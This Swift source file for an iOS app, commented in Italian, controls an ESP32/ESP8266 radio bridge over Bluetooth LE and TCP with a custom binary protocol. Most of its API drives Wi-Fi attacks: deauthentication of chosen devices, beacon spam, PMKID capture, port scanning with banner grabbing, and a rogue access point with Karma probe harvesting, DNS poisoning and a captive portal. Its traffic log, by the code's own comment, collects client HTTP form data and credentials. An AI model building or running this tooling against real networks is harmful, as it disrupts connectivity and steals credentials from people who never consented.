import Foundation
import CoreBluetooth
import Network

// Bridge radio remota (ESP32/ESP8266) via BLE — sblocca i vettori PLAN
// (deauth, beacon spam, PMKID) senza uscire dall'app.
// Protocollo binario framed (stile NRSuite/Marauder, non ASCII):
//   TX: [0xA5][len:u16 LE][seq:u8][cmd:u8][payload][crc8]
//   RX: [0x5A][len:u16 LE][seq:u8(=cmd di richiesta)][status:u8][payload][crc8]
final class BridgeManager: NSObject, ObservableObject, CBCentralManagerDelegate, CBPeripheralDelegate {
    // HM-10/ESP32 classico: FFE0 (service) / FFE1 (write+notify)
    static let svcUUID = CBUUID(string: "0000FFE0-0000-1000-8000-00805F9B34FB")
    static let chrUUID = CBUUID(string: "0000FFE1-0000-1000-8000-00805F9B34FB")

    @Published var state = "off"
    @Published var connected = false
    @Published var deviceName: String?
    @Published var bridgeLog: [String] = []
    @Published var scanNets: [BridgeNet] = []

    struct BridgeNet: Identifiable {
        var id: String { bssid }
        let bssid: String
        let ssid: String
        let ch: Int
        let rssi: Int
        let sec: String
    }

    enum Cmd: UInt8 {
        case ping = 0x01
        case wifiScan = 0x02
        case wifiResults = 0x03
        case deauth = 0x04
        case beaconSpam = 0x05
        case pmkid = 0x06
        case stop = 0x07
    }

    private var central: CBCentralManager?
    private var peripheral: CBPeripheral?
    private var chr: CBCharacteristic?
    private var seq: UInt8 = 0
    private var rxBuffer: [UInt8] = []
    private var responseCont: CheckedContinuation<(UInt8, Data)?, Never>?
    private var scanCont: CheckedContinuation<[BridgeNet], Never>?

    func start() {
        guard central == nil else { return }
        state = "scanning"
        central = CBCentralManager(delegate: self, queue: nil)
    }

    func log(_ s: String) {
        bridgeLog.append("[bridge] \(s)")
        if bridgeLog.count > 200 { bridgeLog.removeFirst(bridgeLog.count - 200) }
    }

    // MARK: CBCentral

    func centralManagerDidUpdateState(_ central: CBCentralManager) {
        if central.state == .poweredOn {
            central.scanForPeripherals(withServices: [Self.svcUUID], options: nil)
            state = "ricerca ESP32…"
        } else {
            state = "BLE off"
        }
    }

    func centralManager(_ central: CBCentralManager, didDiscover peripheral: CBPeripheral,
                        advertisementData: [String: Any], rssi RSSI: NSNumber) {
        central.stopScan()
        self.peripheral = peripheral
        peripheral.delegate = self
        central.connect(peripheral, options: nil)
        deviceName = peripheral.name ?? "ESP32"
        state = "connessione a \(deviceName ?? "?")…"
    }

    func centralManager(_ central: CBCentralManager, didConnect peripheral: CBPeripheral) {
        peripheral.discoverServices([Self.svcUUID])
    }

    func centralManager(_ central: CBCentralManager, didFailToConnect peripheral: CBPeripheral, error: Error?) {
        state = "connessione fallita"
        log("connect fail: \(error?.localizedDescription ?? "?")")
    }

    func peripheral(_ peripheral: CBPeripheral, didDiscoverServices error: Error?) {
        guard let svc = peripheral.services?.first(where: { $0.uuid == Self.svcUUID }) else { return }
        peripheral.discoverCharacteristics([Self.chrUUID], for: svc)
    }

    func peripheral(_ peripheral: CBPeripheral, didDiscoverCharacteristicsFor service: CBService, error: Error?) {
        guard let c = service.characteristics?.first(where: { $0.uuid == Self.chrUUID }) else { return }
        chr = c
        peripheral.setNotifyValue(true, for: c)
        connected = true
        state = "connesso (\(deviceName ?? "ESP32"))"
        log("bridge connesso ✓")
        send(.ping)
    }

    func centralManager(_ central: CBCentralManager, didDisconnectPeripheral peripheral: CBPeripheral, error: Error?) {
        connected = false
        chr = nil
        state = "disconnesso"
        log("bridge disconnesso")
    }

    // MARK: Framing

    private func crc8(_ data: [UInt8]) -> UInt8 {
        var crc: UInt8 = 0
        for b in data {
            crc ^= b
            for _ in 0..<8 {
                crc = (crc & 0x80) != 0 ? (crc << 1) ^ 0x07 : (crc << 1)
            }
        }
        return crc
    }

    private func send(_ cmd: Cmd, payload: [UInt8] = []) {
        guard connected, let chr else {
            log("send \(cmd): bridge non connesso")
            return
        }
        seq &+= 1
        var frame: [UInt8] = [0xA5, 0, 0, seq, cmd.rawValue]
        frame[1] = UInt8(payload.count & 0xFF)
        frame[2] = UInt8((payload.count >> 8) & 0xFF)
        frame += payload
        frame.append(crc8(Array(frame.dropFirst())))  // CRC dopo l'header (spec firmware, come RX)
        peripheral?.writeValue(Data(frame), for: chr, type: .withResponse)
        log("TX \(cmd) (\(payload.count)B)")
    }

    private func sendAwait(_ cmd: Cmd, payload: [UInt8] = [], timeout: TimeInterval = 8) async -> (UInt8, Data)? {
        guard connected else { return nil }
        return await withCheckedContinuation { c in
            // sendAwait sovrapposti sovrascriverebbero la continuation pendente → rifiuto
            guard responseCont == nil else { c.resume(returning: nil); return }
            responseCont = c
            send(cmd, payload: payload)
            DispatchQueue.global().asyncAfter(deadline: .now() + timeout) { [weak self] in
                guard let self else { return }
                self.resumeResponse(nil)
            }
        }
    }

    private func resumeResponse(_ r: (UInt8, Data)?) {
        DispatchQueue.main.async {
            guard let c = self.responseCont else { return }
            self.responseCont = nil
            c.resume(returning: r)
        }
    }

    private func resumeScan(_ nets: [BridgeNet]) {
        DispatchQueue.main.async {
            guard let c = self.scanCont else { return }
            self.scanCont = nil
            c.resume(returning: nets)
        }
    }

    func peripheral(_ peripheral: CBPeripheral, didUpdateValueFor characteristic: CBCharacteristic, error: Error?) {
        guard let data = characteristic.value else { return }
        rxBuffer += [UInt8](data)
        guard let frame = popFrame() else { return }
        guard frame.status == 0x00 else {
            log("RX error \(frame.status)")
            resumeResponse((frame.status, Data()))
            return
        }
        switch frame.cmdEcho {
        case 0x02, 0x03: // wifiResults — eco del cmd richiesta o esplicito
            resumeScan(parseNets(frame.payload))
            resumeResponse((0, Data()))
        default:
            resumeResponse((0, Data(frame.payload)))
        }
    }

    private func popFrame() -> (status: UInt8, cmdEcho: UInt8, payload: [UInt8])? {
        while rxBuffer.count >= 5 {
            guard rxBuffer[0] == 0x5A else { rxBuffer.removeFirst(); continue }
            let len = Int(rxBuffer[1]) | (Int(rxBuffer[2]) << 8)
            guard rxBuffer.count >= len + 6 else { return nil }
            let body = Array(rxBuffer[1..<(len + 5)])
            let crc = rxBuffer[5 + len]
            guard crc8(body) == crc else {
                log("crc err — scarto frame")
                rxBuffer.removeFirst(6 + len)
                continue
            }
            let seqb = rxBuffer[3]
            let status = rxBuffer[4]
            let payload = Array(rxBuffer[5..<(5 + len)])
            rxBuffer.removeFirst(6 + len)
            return (status, seqb, payload)
        }
        return nil
    }

    // payload nets: [rssi:i8][ch:u8][bssid:6][sec:u8][ssidLen:u8][ssid…]
    private func parseNets(_ p: [UInt8]) -> [BridgeNet] {
        var out: [BridgeNet] = []
        var i = 0
        while i + 10 <= p.count {
            let rssi = Int(Int8(bitPattern: p[i])); i += 1
            let ch = Int(p[i]); i += 1
            let bssid = p[i..<(i + 6)].map { String(format: "%02X", $0) }.joined(separator: ":"); i += 6
            let sec = p[i] == 0 ? "OPEN" : "WPA2"; i += 1
            let sl = Int(p[i]); i += 1
            guard i + sl <= p.count else { break }
            let ssid = String(decoding: p[i..<(i + sl)], as: UTF8.self); i += sl
            out.append(BridgeNet(bssid: bssid, ssid: ssid.isEmpty ? "(hidden)" : ssid, ch: ch, rssi: rssi, sec: sec))
        }
        return out
    }

    // MARK: API

    func ping() async -> Bool {
        let r = await sendAwait(.ping)
        return r != nil
    }

    func wifiScan(seconds: Int = 8) async -> [BridgeNet] {
        guard connected else { return [] }
        CrashTracer.mark("ble scan start")
        let nets = await withCheckedContinuation { (c: CheckedContinuation<[BridgeNet], Never>) in
            scanCont = c
            send(.wifiScan, payload: [UInt8(seconds)])
            CrashTracer.mark("ble scan frame sent")
            DispatchQueue.global().asyncAfter(deadline: .now() + Double(seconds) + 6) { [weak self] in
                guard let self else { return }
                self.resumeScan([])
            }
        }
        CrashTracer.mark("ble scan done nets=\(nets.count)")
        scanNets = nets
        log("wifi scan: \(nets.count) rete(e)")
        return nets
    }

    func deauth(mac: String, ch: Int, count: Int = 10) async -> Bool {
        guard connected, var m = mac.replacingOccurrences(of: ":", with: "").hexBytes, m.count == 6 else {
            log("deauth: mac invalido")
            return false
        }
        m.append(UInt8(ch))
        m.append(UInt8(count))
        let r = await sendAwait(.deauth, payload: m)
        let ok = r?.0 == 0
        log(ok ? "deauth \(mac) inviata ✓" : "deauth fallita")
        return ok
    }

    func beaconSpam(ssids: [String]) async -> Bool {
        guard connected, !ssids.isEmpty else { return false }
        var payload: [UInt8] = [UInt8(ssids.count)]
        for s in ssids.prefix(16) {
            let b = Array(s.utf8.prefix(32))
            payload.append(UInt8(b.count))
            payload += b
        }
        let r = await sendAwait(.beaconSpam, payload: payload, timeout: 10)
        log(r?.0 == 0 ? "beacon spam attivo (\(ssids.count) SSID)" : "beacon spam fallito")
        return r?.0 == 0
    }

    func pmkid(mac: String, ch: Int) async -> Bool {
        guard connected, var m = mac.replacingOccurrences(of: ":", with: "").hexBytes, m.count == 6 else { return false }
        m.append(UInt8(ch))
        let r = await sendAwait(.pmkid, payload: m, timeout: 20)
        return r?.0 == 0
    }

    func stopAll() {
        send(.stop)
    }
}

extension String {
    var hexBytes: [UInt8]? {
        guard count % 2 == 0 else { return nil }
        var out: [UInt8] = []
        var it = makeIterator()
        while let a = it.next(), let b = it.next(),
              let x = UInt8(String(a), radix: 16), let y = UInt8(String(b), radix: 16) {
            out.append(x << 4 | y)
        }
        return out.count == count / 2 ? out : nil
    }
}

// ===== Bridge TCP (ESP8266 transparent TCP<->UART) =====
// Scoperta: mDNS _rhsbridge._tcp (hotspot iPhone) o AP "RHS-Bridge" (192.168.4.1).
// Stesso protocollo framed RHS; rawSend per passthrough Proxmark/PN532 su UART.
final class TCPBridge: NSObject, ObservableObject {
    @Published var connected = false
    @Published var state = "off"
    @Published var deviceName = "ESP8266"
    @Published var bridgeLog: [String] = []
    @Published var scanNets: [BridgeManager.BridgeNet] = []
    @Published var foundHosts: [String] = []
    @Published var browsing = false

    private var conn: NWConnection?
    private var browser: NWBrowser?
    private var rx = [UInt8]()
    private var seq: UInt8 = 0
    private var retryTimer: Timer?
    private var responseCont: CheckedContinuation<(UInt8, Data)?, Never>?
    private var scanCont: CheckedContinuation<[BridgeManager.BridgeNet], Never>?

    func log(_ s: String) {
        DispatchQueue.main.async {
            self.bridgeLog.append("[tcp] \(s)")
            if self.bridgeLog.count > 200 { self.bridgeLog.removeFirst(self.bridgeLog.count - 200) }
        }
    }

    // MARK: auto-connect (firmware STA: l'ESP si aggancia al hotspot iPhone, IP = DHCP)

    func startAutoConnect() {
        guard !connected else { return }
        DispatchQueue.main.async { [weak self] in
            guard let self else { return }
            self.state = "auto-connect: sweep subnet…"
            self.retryTimer?.invalidate()
            self.retryTimer = Timer.scheduledTimer(withTimeInterval: 18, repeats: true) { [weak self] _ in
                guard let self else { return }
                guard !self.connected else {
                    self.retryTimer?.invalidate()
                    self.retryTimer = nil
                    return
                }
                self.sweep()
            }
        }
        sweep()
    }

    // MARK: scoperta

    private var sweeping = false

    // hotspot iOS non inoltra il multicast mDNS → sweep TCP diretto sulla /28
    func sweep() {
        guard !sweeping, !connected else { return }
        sweeping = true
        let candidates = (2...14).map { "172.20.10.\($0)" } + ["192.168.4.1"]
        state = "sweep subnet…"
        log("sweep TCP 3333 su subnet hotspot…")
        Task {
            defer { sweeping = false }
            for ip in candidates {
                DispatchQueue.main.async { self.state = "probe \(ip)…" }
                if await probe(ip) {
                    DispatchQueue.main.async {
                        self.state = "ESP trovato: \(ip)"
                        self.log("ESP trovato su \(ip) ✓")
                        self.connect(host: ip)
                    }
                    return
                }
            }
            DispatchQueue.main.async { self.state = "nessun ESP sulla subnet — prova AP mode" }
        }
    }

    private func probe(_ ip: String) async -> Bool {
        await withCheckedContinuation { c in
            let lock = NSLock()
            var done = false
            let conn = NWConnection(host: NWEndpoint.Host(ip), port: 3333, using: .tcp)
            let finish: (Bool) -> Void = {
                lock.lock()
                let first = !done
                if first { done = true }
                lock.unlock()
                guard first else { return }
                conn.cancel()
                c.resume(returning: $0)
            }
            let timer = DispatchWorkItem { finish(false) }
            DispatchQueue.global().asyncAfter(deadline: .now() + 0.6, execute: timer)
            conn.stateUpdateHandler = { s in
                switch s {
                case .ready: timer.cancel(); finish(true)
                case .failed, .cancelled: timer.cancel(); finish(false)
                default: break
                }
            }
            conn.start(queue: .global(qos: .utility))
        }
    }

    func browse() {
        browsing = true
        foundHosts = []
        let params = NWParameters()
        params.includePeerToPeer = true
        let b = NWBrowser(for: .bonjour(type: "_rhsbridge._tcp.", domain: nil), using: params)
        browser = b
        b.browseResultsChangedHandler = { [weak self] results, _ in
            var hosts: [String] = []
            for r in results {
                if case let .service(name, _, _, _) = r.endpoint {
                    hosts.append(String(name))
                } else if case let .hostPort(h, p) = r.endpoint {
                    hosts.append("\(h):\(p)")
                }
            }
            DispatchQueue.main.async {
                self?.foundHosts = Array(Set(hosts)).sorted()
                self?.browsing = false
                self?.log("mDNS: \(self?.foundHosts.count ?? 0) bridge trovati")
            }
        }
        b.start(queue: .global(qos: .utility))
        log("browse _rhsbridge._tcp…")
    }

    // path "AP dell'ESP": l'utente entra nell'AP "RHS-Bridge" dalle Impostazioni iOS,
    // qui si connette al gateway di default dell'ESP8266
    func joinAP() {
        connect(host: "192.168.4.1")
    }

    // MARK: connessione

    private var lastHost = "192.168.4.1"
    private var lastPort: UInt16 = 3333
    private var retriesLeft = 0
    private var manual = false

    func connect(host: String, port: UInt16 = 3333) {
        manual = false
        disconnect()
        lastHost = host
        lastPort = port
        retriesLeft = 3
        state = "connessione a \(host)…"
        log("connect \(host):\(port)")
        let c = NWConnection(host: NWEndpoint.Host(host), port: NWEndpoint.Port(rawValue: port)!,
                             using: .tcp)
        conn = c
        c.stateUpdateHandler = { [weak self] s in
            DispatchQueue.main.async {
                switch s {
                case .ready:
                    self?.connected = true
                    self?.retriesLeft = 3
                    self?.state = "connesso (\(host))"
                    self?.log("TCP connesso ✓")
                case .failed(let e):
                    self?.connected = false
                    self?.state = "fallito: \(e.localizedDescription)"
                    self?.scheduleReconnect()
                case .cancelled:
                    self?.connected = false
                    self?.state = "off"
                default: break
                }
            }
        }
        c.start(queue: .global(qos: .utility))
        pump()
    }

    // reconnect automatico: durante lo scan l'AP dell'ESP salta canale (~2s)
    // e il TCP muore — 3 tentativi a 3s coprono il rejoin del telefono
    private func scheduleReconnect() {
        guard !manual, retriesLeft > 0 else { return }
        retriesLeft -= 1
        let h = lastHost, p = lastPort
        log("reconnect (\(retriesLeft + 1) rimasti)…")
        DispatchQueue.main.asyncAfter(deadline: .now() + 3) { [weak self] in
            guard let self, !self.manual, !self.connected else { return }
            self.connect(host: h, port: p)
        }
    }

    func disconnect() {
        manual = true
        conn?.cancel()
        conn = nil
        connected = false
        state = "off"
    }

    private func pump() {
        conn?.receive(minimumIncompleteLength: 1, maximumLength: 8192) { [weak self] data, _, _, err in
            guard let self else { return }
            if let data, !data.isEmpty {
                self.rx += [UInt8](data)
                while let frame = self.popFrame() {
                    self.handle(frame)
                }
            }
            if err == nil { self.pump() }
            else {
                DispatchQueue.main.async {
                    self.connected = false
                    self.state = "disconnesso"
                    self.scheduleReconnect()
                }
            }
        }
    }

    // MARK: framing (spec RHS, identica al firmware)

    private func crc8(_ data: [UInt8]) -> UInt8 {
        var crc: UInt8 = 0
        for b in data {
            crc ^= b
            for _ in 0..<8 {
                crc = (crc & 0x80) != 0 ? (crc << 1) ^ 0x07 : (crc << 1)
            }
        }
        return crc
    }

    private func send(_ cmd: UInt8, payload: [UInt8]) {
        guard let c = conn, c.state == .ready else { return }
        seq &+= 1
        var f: [UInt8] = [0xA5, 0, 0, seq, cmd]
        f[1] = UInt8(payload.count & 0xFF)
        f[2] = UInt8((payload.count >> 8) & 0xFF)
        f += payload
        f.append(crc8(Array(f.dropFirst())))
        c.send(content: Data(f), completion: .contentProcessed { _ in })
    }

    // passthrough UART: byte grezzi verso Proxmark/PN532
    func rawSend(_ bytes: [UInt8]) {
        guard let c = conn, c.state == .ready else { return }
        c.send(content: Data(bytes), completion: .contentProcessed { _ in })
        log("raw → UART (\(bytes.count)B)")
    }

    // resume-once: niente doppio resume (crash "continuation misuse")
    private func resumeResponse(_ r: (UInt8, Data)?) {
        DispatchQueue.main.async {
            guard let c = self.responseCont else { return }
            self.responseCont = nil
            c.resume(returning: r)
        }
    }

    private func resumeScan(_ nets: [BridgeManager.BridgeNet]) {
        DispatchQueue.main.async {
            guard let c = self.scanCont else { return }
            self.scanCont = nil
            c.resume(returning: nets)
        }
    }

    private func sendAwait(_ cmd: UInt8, payload: [UInt8], timeout: TimeInterval = 10) async -> (UInt8, Data)? {
        guard connected else { return nil }
        return await withCheckedContinuation { c in
            // sendAwait sovrapposti sovrascriverebbero la continuation pendente → rifiuto
            guard responseCont == nil else { c.resume(returning: nil); return }
            responseCont = c
            send(cmd, payload: payload)
            DispatchQueue.global().asyncAfter(deadline: .now() + timeout) { [weak self] in
                guard let self else { return }
                self.resumeResponse(nil)
            }
        }
    }

    private func popFrame() -> (status: UInt8, cmdEcho: UInt8, payload: [UInt8])? {
        while rx.count >= 6 {
            guard rx[0] == 0x5A else { rx.removeFirst(); continue }
            let len = Int(rx[1]) | (Int(rx[2]) << 8)
            guard rx.count >= len + 6 else { return nil }
            let body = Array(rx[1..<(len + 5)])
            let crc = rx[5 + len]
            guard crc8(body) == crc else {
                log("crc err — scarto")
                rx.removeFirst(6 + len)
                continue
            }
            let cmdEcho = rx[3]
            let status = rx[4]
            let payload = Array(rx[5..<(5 + len)])
            rx.removeFirst(6 + len)
            return (status, cmdEcho, payload)
        }
        return nil
    }

    private func handle(_ f: (status: UInt8, cmdEcho: UInt8, payload: [UInt8])) {
        DispatchQueue.main.async {
            guard f.status == 0x00 else {
                self.log("RX status err \(f.status)")
                self.resumeResponse((f.status, Data()))
                return
            }
            switch f.cmdEcho {
            case 0x02, 0x03: // wifiResults — l'eco del cmd richiesta (0x02) o esplicito (0x03)
                self.resumeScan(self.parseNets(f.payload))
                self.resumeResponse((0, Data()))
            default:
                self.resumeResponse((0, Data(f.payload)))
            }
        }
    }

    private func parseNets(_ p: [UInt8]) -> [BridgeManager.BridgeNet] {
        var out: [BridgeManager.BridgeNet] = []
        var i = 0
        while i + 10 <= p.count {
            let rssi = Int(Int8(bitPattern: p[i])); i += 1
            let ch = Int(p[i]); i += 1
            let bssid = p[i..<(i + 6)].map { String(format: "%02X", $0) }.joined(separator: ":"); i += 6
            let sec = p[i] == 0 ? "OPEN" : "WPA2"; i += 1
            let sl = Int(p[i]); i += 1
            guard i + sl <= p.count else { break }
            let ssid = String(decoding: p[i..<(i + sl)], as: UTF8.self); i += sl
            out.append(.init(bssid: bssid, ssid: ssid.isEmpty ? "(hidden)" : ssid, ch: ch, rssi: rssi, sec: sec))
        }
        return out
    }

    // MARK: API alta

    func ping() async -> Bool {
        await sendAwait(0x01, payload: []) != nil
    }

    func wifiScan(seconds: Int = 8) async -> [BridgeManager.BridgeNet] {
        guard connected else { return [] }
        CrashTracer.mark("tcp scan start")
        let nets = await withCheckedContinuation { (c: CheckedContinuation<[BridgeManager.BridgeNet], Never>) in
            scanCont = c
            send(0x02, payload: [UInt8(seconds)])
            CrashTracer.mark("tcp scan frame sent")
            DispatchQueue.global().asyncAfter(deadline: .now() + Double(seconds) + 12) { [weak self] in
                guard let self else { return }
                self.resumeScan([])
            }
        }
        CrashTracer.mark("tcp scan done nets=\(nets.count)")
        scanNets = nets
        log("wifi scan: \(nets.count) rete(e)")
        return nets
    }

    func deauth(mac: String, ch: Int, count: Int = 10) async -> Bool {
        guard var m = mac.replacingOccurrences(of: ":", with: "").hexBytes, m.count == 6 else { return false }
        m.append(UInt8(ch))
        m.append(UInt8(count))
        let r = await sendAwait(0x04, payload: m)
        log(r?.0 == 0 ? "deauth \(mac) ✓" : "deauth fallita")
        return r?.0 == 0
    }

    func beaconSpam(ssids: [String]) async -> Bool {
        guard !ssids.isEmpty else { return false }
        var pl: [UInt8] = [UInt8(min(16, ssids.count))]
        for s in ssids.prefix(16) {
            let b = Array(s.utf8.prefix(32))
            pl.append(UInt8(b.count))
            pl += b
        }
        let r = await sendAwait(0x05, payload: pl, timeout: 12)
        log(r?.0 == 0 ? "beacon spam ✓" : "beacon fallito")
        return r?.0 == 0
    }

    func pmkid(mac: String, ch: Int) async -> Bool {
        guard var m = mac.replacingOccurrences(of: ":", with: "").hexBytes, m.count == 6 else { return false }
        m.append(UInt8(ch))
        let r = await sendAwait(0x06, payload: m, timeout: 30)
        return r?.0 == 0
    }

    func stopAll() {
        send(0x07, payload: [])
    }

    // MARK: ops di rete via radio ESP (il telefono orchestra, l'ESP esegue sulla rete target)

    // roundtrip generico: copre MQTT/RTSP/telnet (TCP) e SNMP/CoAP/UPnP (UDP)
    func roundTrip(host: String, port: Int, payload: [UInt8], udp: Bool = false, timeout: TimeInterval = 4) async -> Data? {
        guard connected else { return nil }
        var ip = host.split(separator: ".").compactMap { UInt8($0) }
        guard ip.count == 4 else { log("roundTrip: serve un IP numerico, non \(host)"); return nil }
        ip += [UInt8(port & 0xFF), UInt8((port >> 8) & 0xFF)]
        ip.append(UInt8(min(250, max(10, Int(timeout * 10)))))
        ip += [UInt8(payload.count & 0xFF), UInt8((payload.count >> 8) & 0xFF)]
        ip += payload
        let r = await sendAwait(udp ? 0x12 : 0x11, payload: ip, timeout: timeout + 14)
        guard r?.0 == 0 else {
            if let r { log("roundtrip \(host):\(port) err \(r.0)") }
            return nil
        }
        return r?.1
    }

    // port scan via bridge: [port u16 LE][bannerLen][banner]...
    func portScan(host: String, ports: [UInt16]) async -> [(UInt16, String)] {
        guard connected else { return [] }
        var ip = host.split(separator: ".").compactMap { UInt8($0) }
        guard ip.count == 4 else { return [] }
        var p = ports.prefix(12).map { [UInt8($0 & 0xFF), UInt8(($0 >> 8) & 0xFF)] }.flatMap { $0 }
        ip.append(UInt8(ports.prefix(12).count))
        ip += p
        p.removeAll()
        let r = await sendAwait(0x10, payload: ip, timeout: 26)
        guard let r, r.0 == 0 else { return [] }
        var out: [(UInt16, String)] = []
        let d = r.1
        var i = 0
        while i + 3 <= d.count {
            let port = UInt16(d[i]) | (UInt16(d[i + 1]) << 8)
            let bl = Int(d[i + 2])
            i += 3
            guard i + bl <= d.count else { break }
            let banner = String(decoding: d[i..<(i + bl)], as: UTF8.self)
            i += bl
            out.append((port, banner))
        }
        log("port scan \(host): \(out.count) porte aperte")
        return out
    }

    // STA dell'ESP verso la RETE TARGET (l'AP del bridge resta attivo)
    func joinTarget(_ ssid: String, _ pass: String) async -> Bool {
        guard connected else { return false }
        var pl: [UInt8] = [UInt8(min(32, ssid.utf8.count))] + Array(ssid.utf8.prefix(32))
        pl += [UInt8(min(64, pass.utf8.count))] + Array(pass.utf8.prefix(64))
        let r = await sendAwait(0x08, payload: pl, timeout: 22)
        if let r, r.0 == 0 {
            log("join rete target OK — IP ESP: \(String(decoding: r.1, as: UTF8.self))")
            return true
        }
        log("join rete target fallita")
        return false
    }

    // MARK: PineApple (rogue AP sull'ESP — AP+STA, il bridge resta su hotspot)

    struct RogueClient: Identifiable {
        var id: String { mac }
        let mac: String
        let ip: String
    }

    @Published var rogueClients: [RogueClient] = []
    @Published var rogueOn = false

    func rogueStart(ssid: String, pass: String, dnsFwd: Bool) async -> Bool {
        guard connected else { return false }
        var p: [UInt8] = [UInt8(min(32, ssid.utf8.count))] + Array(ssid.utf8.prefix(32))
        let pw = Array(pass.utf8.prefix(64))
        p += [UInt8(pw.count)] + pw
        p.append(dnsFwd ? 1 : 0)   // 1 = internet reale + log qname, 0 = poison/portal
        let ok = await sendAwait(0x13, payload: p, timeout: 12)?.0 == 0
        rogueOn = ok
        log(ok ? "rogue AP '\(ssid)' ON (dns=\(dnsFwd ? "internet" : "poison"))" : "rogue AP start fallito")
        return ok
    }

    func rogueStop() async -> Bool {
        guard connected else { return false }
        let ok = await sendAwait(0x14, payload: [], timeout: 10)?.0 == 0
        rogueOn = !ok
        if ok { rogueClients = [] }
        log(ok ? "rogue AP OFF" : "rogue stop fallito")
        return ok
    }

    func rogueClientsRefresh() async {
        guard connected else { return }
        guard let r = await sendAwait(0x15, payload: [], timeout: 8), r.0 == 0,
              r.1.count >= 1 else { return }
        let cnt = Int(r.1[0])
        var out: [RogueClient] = []
        var o = 1
        for _ in 0..<cnt where o + 10 <= r.1.count {
            let mac = r.1[o..<(o + 6)].map { String(format: "%02X", $0) }.joined(separator: ":")
            o += 6
            let ip = "\(r.1[o]).\(r.1[o+1]).\(r.1[o+2]).\(r.1[o+3])"
            o += 4
            out.append(RogueClient(mac: mac, ip: ip))
        }
        rogueClients = out
        log("rogue clients: \(cnt)")
    }

    func karma(_ on: Bool) async -> [String] {
        guard connected else { return [] }
        guard let r = await sendAwait(0x16, payload: [on ? 1 : 0], timeout: on ? 8 : 12), r.0 == 0 else { return [] }
        guard !on else { return [] }
        let csv = String(decoding: r.1, as: UTF8.self)
        let ssids = csv.isEmpty ? [] : csv.split(separator: ",").map(String.init)
        log("karma probe trovati: \(ssids.count)")
        return ssids
    }

    func portalSet(_ html: String) async -> Bool {
        guard connected else { return false }
        let b = Array(html.utf8.prefix(780))
        var p: [UInt8] = [UInt8(b.count & 0xFF), UInt8((b.count >> 8) & 0xFF)]
        p += b
        let ok = await sendAwait(0x17, payload: p, timeout: 8)?.0 == 0
        log(ok ? "portal impostato (\(b.count)B)" : "portal fallito")
        return ok
    }

    // NAPT (internet per i client del rogue AP) + mode DNS: 0=poison/portal, 1=forward reale
    func nat(_ on: Bool, dnsFwd: Bool) async -> Bool {
        guard connected else { return false }
        let ok = await sendAwait(0x18, payload: [on ? 1 : 0, dnsFwd ? 1 : 0], timeout: 8)?.0 == 0
        log(ok ? "nat=\(on) dns=\(dnsFwd ? "forward" : "poison")" : "nat fallito")
        return ok
    }

    // log traffico client: "D:qname" (domini) e "H:..." (richieste HTTP + form/credenziali)
    func trafficLog() async -> [String] {
        guard connected else { return [] }
        guard let r = await sendAwait(0x19, payload: [], timeout: 8), r.0 == 0 else { return [] }
        let csv = String(decoding: r.1, as: UTF8.self)
        let items = csv.isEmpty ? [] : csv.components(separatedBy: "|")
        log("traffic log: \(items.count) voci")
        return items
    }
}
